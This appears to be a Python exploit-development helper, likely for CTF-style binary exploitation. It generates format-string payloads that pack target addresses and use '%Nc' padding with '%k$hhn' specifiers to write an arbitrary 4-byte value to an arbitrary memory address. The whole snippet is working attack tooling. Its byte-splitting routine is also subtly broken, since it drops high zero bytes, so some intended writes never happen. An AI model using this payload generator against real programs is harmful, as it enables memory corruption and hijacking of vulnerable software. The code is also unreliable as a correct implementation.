def splitByte4(byte4, *, littleEndian = True):
    assert(type(byte4) is int)
    result = []
    while byte4:
        result.append(byte4 & 0xFF)
        # result = [byte4 & 0xFF, *byte4]
        byte4 >>= 8
    return result if littleEndian else result[::-1]

def packFmt(byteArray, pad=0):
    items = [(byteArray[i], i) for i in range(len(byteArray))]
    return sorted(items, key=lambda t: (t[0] - pad) & 0xFF)

def genFmtStr(byte4, where, stackStart):
    payload = b''
    payload += p32(where+0)
    payload += p32(where+1)
    payload += p32(where+2)
    payload += p32(where+3)
    dataLen = len(payload)
    packedValues = packFmt(splitByte4(byte4), dataLen)
    for value in packedValues:
        change = (value[0] - dataLen) & 0xFF
        part = f'%{change}c'.encode() if change else b''
        payload += part
        payload += f'%{stackStart + value[1]}$hhn'.encode()
        dataLen += change
    return payload